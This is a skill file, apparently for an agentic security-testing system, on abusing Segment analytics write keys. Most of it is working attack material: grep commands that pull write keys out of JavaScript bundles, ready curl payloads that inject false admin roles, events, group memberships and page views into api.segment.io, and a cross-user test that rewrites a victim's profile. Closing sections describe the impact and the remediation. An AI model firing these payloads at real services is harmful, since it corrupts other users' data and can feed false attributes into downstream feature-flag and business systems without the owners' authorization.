---
name: analytics-poisoning
description: Segment/Analytics data poisoning, third-party SDK abuse, write key abuse. After DISCOVERY finds candidates — active testing, payload firing. Use when testing analytics/SDK vulnerabilities.
---

# SKILL-ANALYTICS-POISONING — Third-Party Analytics & SDK Data Poisoning — HUNT
# Phase Coverage: 39 (cross-cutting), Phase 48 (chaining)
# Vuln Classes: Analytics Data Poisoning, SDK Write Key Abuse, Third-Party Data Manipulation
# Purpose: Discovery and exploitation of third-party analytics/tracking SDK vulnerabilities
# Source: Codacy.com findings — Segment write key abuse (HIGH)

---

## Philosophy

```
Third-party analytics SDKs (Segment, Mixpanel, Amplitude, Heap, Hotjar, LaunchDarkly)
are loaded CLIENT-SIDE with write keys embedded in JavaScript. These keys often have
WRITE access to production analytics data — and the frontend never validates that
the user sending data is authorized to do so.

IMPACT: An attacker can poison analytics data by sending arbitrary identify/track/group/page
calls, corrupting user profiles, injecting false business metrics, and poisoning
downstream data warehouses.
```

---

## Pattern Index

| Pattern | Source | CIA Impact | Discovery Time |
|---------|--------|-----------|----------------|
| P1: Segment Write Key Extraction | Codacy C1 | I:H | 2 min (grep env.js) |
| P2: Segment API Abuse — Identify/Track/Group/Page | Codacy C2 | I:H | 5 min (curl/browser) |
| P3: Analytics SDK Version → CVE Mapping | Codacy C3 | Varies | 3 min (version extract) |
| P4: Downstream Data Poisoning | Codacy C4 | I:H | N/A (follows P2) |

---

## P1: Segment Write Key Extraction

```
CIA: I:H — Write key enables arbitrary data injection into production analytics
TIME: 2 minutes
```

### Discovery

```bash
# Method 1: Check env.js / config.js endpoints
curl -sk "$TARGET/static/js/env.js" | grep -oP '(write_key|writeKey|analytics_key)["\s:=]+["\'][a-zA-Z0-9]{20,}["\']'

# Method 2: Grep JS bundles for Segment patterns
grep -rhoP '(write_key|writeKey)["\s:=]+["\'][a-zA-Z0-9]{20,}["\']' \
  ~/agents/finetune/fullrecon/${SLUG}/js/*.js 2>/dev/null | sort -u

# Method 3: Check for Segment CDN patterns
grep -rhoP 'cdn\.segment\.com/analytics\.js/v[0-9]+/[^"'\'' ]+' \
  ~/agents/finetune/fullrecon/${SLUG}/js/*.js 2>/dev/null | sort -u

# Method 4: Browser DevTools — search for "write_key" in Sources
# Method 5: Network tab — look for calls to api.segment.io or cdn.segment.com
```

### Validation Checklist
```
□ Write key found in client-side code (env.js, JS bundles, config)
□ Write key has WRITE access (not just read)
□ Key is for production environment (not dev/test)
□ Key is shared across all users (not per-session)
```

---

## P2: Segment API Abuse — Identify/Track/Group/Page

```
CIA: I:H — Inject arbitrary user traits, events, group memberships
TIME: 5 minutes (curl or browser console)
```

### Discovery — Test Write Key Access

```bash
# Step 1: Test identify (set arbitrary user traits)
curl -sk -X POST "https://api.segment.io/v1/identify" \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "TARGET_USER_ID",
    "traits": {
      "email": "victim@target.com",
      "role": "admin",
      "user_role": "admin",
      "organization_plan": "enterprise",
      "is_admin": true,
      "admin": true,
      "privilege": "superadmin",
      "credits": 999999
    },
    "context": {
      "library": {"name": "analytics.js", "version": "2.11.0"},
      "page": {"path": "/", "referrer": "", "title": "PoC", "url": "https://target.com/"},
      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    },
    "timestamp": "2026-07-11T00:00:00Z",
    "writeKey": "WRITE_KEY_HERE"
  }' -w " HTTP:%{http_code}"

# Step 2: Test track (inject arbitrary events)
curl -sk -X POST "https://api.segment.io/v1/track" \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "TARGET_USER_ID",
    "event": "Admin Privileges Granted",
    "properties": {
      "action": "role_change",
      "new_role": "admin",
      "granted_by": "system",
      "reason": "security_audit"
    },
    "context": {"library": {"name": "analytics.js", "version": "2.11.0"}},
    "timestamp": "2026-07-11T00:00:00Z",
    "writeKey": "WRITE_KEY_HERE"
  }' -w " HTTP:%{http_code}"

# Step 3: Test group (inject group membership)
curl -sk -X POST "https://api.segment.io/v1/group" \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "TARGET_USER_ID",
    "groupId": "ADMIN_GROUP_ID",
    "traits": {
      "name": "Administrators",
      "plan": "enterprise",
      "role": "admin"
    },
    "context": {"library": {"name": "analytics.js", "version": "2.11.0"}},
    "timestamp": "2026-07-11T00:00:00Z",
    "writeKey": "WRITE_KEY_HERE"
  }' -w " HTTP:%{http_code}"

# Step 4: Test page (inject page view data)
curl -sk -X POST "https://api.segment.io/v1/page" \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "TARGET_USER_ID",
    "name": "Admin Dashboard",
    "properties": {
      "path": "/admin/dashboard",
      "referrer": "https://target.com/",
      "title": "Admin Dashboard",
      "url": "https://target.com/admin/dashboard"
    },
    "context": {"library": {"name": "analytics.js", "version": "2.11.0"}},
    "timestamp": "2026-07-11T00:00:00Z",
    "writeKey": "WRITE_KEY_HERE"
  }' -w " HTTP:%{http_code}"
```

### Cross-User Poisoning Test (REQUIRED)

```bash
# CRITICAL: Test with multiple real user IDs to prove cross-user impact
# User A (attacker): USER1_ID (395595)
# User B (victim): USER2_ID (395596)

# Poison User B's profile as User A
curl -sk -X POST "https://api.segment.io/v1/identify" \
  -H "Content-Type: application/json" \
  -d "{
    \"userId\": \"USER2_ID\",
    \"traits\": {\"role\": \"admin\", \"is_admin\": true},
    \"context\": {\"library\": {\"name\": \"analytics.js\"}},
    \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",
    \"writeKey\": \"WRITE_KEY_HERE\"
  }" -w " HTTP:%{http_code}"
# Expected: {"success": true} — cross-user data poisoning confirmed
```

### Validation Checklist
```
□ All 4 Segment endpoints accept data (identify/track/group/page)
□ Response returns {"success": true} for arbitrary data
□ Cross-user poisoning works (User A can modify User B's traits)
□ Arbitrary userId accepted (not validated against session)
□ No rate limiting on data submission
□ Traits include sensitive fields (role, plan, credits, is_admin)
□ Downstream systems consume poisoned data (Hotjar, GTM, LaunchDarkly)
```

---

## P3: Analytics SDK Version → CVE Mapping

```
TIME: 3 minutes
```

```bash
# Extract Segment SDK version from JS bundles
grep -rhoP 'analytics\.js/v[0-9.]+' ~/agents/finetune/fullrecon/${SLUG}/js/*.js 2>/dev/null | sort -u

# Extract other SDK versions
grep -rhoP '(hotjar|mixpanel|amplitude|heap|launchdarkly)[^"'\'']*version["\s:=]+["\'][0-9.]+["\']' \
  ~/agents/finetune/fullrecon/${SLUG}/js/*.js 2>/dev/null | sort -u

# Map versions to CVEs using NVD API
for tech in "segment" "hotjar" "mixpanel" "amplitude"; do
  curl -sk "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=$tech&resultsPerPage=5" | \
    jq '.vulnerabilities[].cve.id' 2>/dev/null
done
```

---

## Downstream Impact Assessment

```
Once Segment data is poisoned, evaluate what downstream systems are affected:
  → Hotjar: session recordings, heatmaps, user behavior data corrupted
  → Google Tag Manager: targeting rules based on poisoned user traits
  → LaunchDarkly: feature flags toggled based on poisoned user attributes
  → Data Warehouse: analytics reports, business metrics corrupted
  → CRM/Sales: lead scoring, customer segmentation corrupted
  → A/B Testing: experiment assignments based on poisoned data

BUSINESS IMPACT:
  → Corrupted user behavior analytics → wrong business decisions
  → Poisoned A/B test results → incorrect feature rollout decisions
  → False positive/negative fraud signals → financial impact
  → Corrupted customer segmentation → marketing waste
  → GDPR compliance: poisoned data may violate data integrity principle (Art 5(1)(d))
```

---

## Remediation

```
IMMEDIATE:
  1. Rotate all exposed write keys
  2. Implement Segment Source filters to validate incoming data
  3. Use Segment Protocols to enforce schema validation
  4. Restrict write keys to server-side only (remove from client-side code)

LONG-TERM:
  5. Implement Segment write key allowlisting per endpoint
  6. Use Segment Functions to validate user context server-side
  7. Monitor for anomalous analytics data patterns
  8. Audit all third-party SDK write key exposure
```

---

*SKILL-ANALYTICS-POISONING — Part of the acy Agentic Security Research System v3.0*
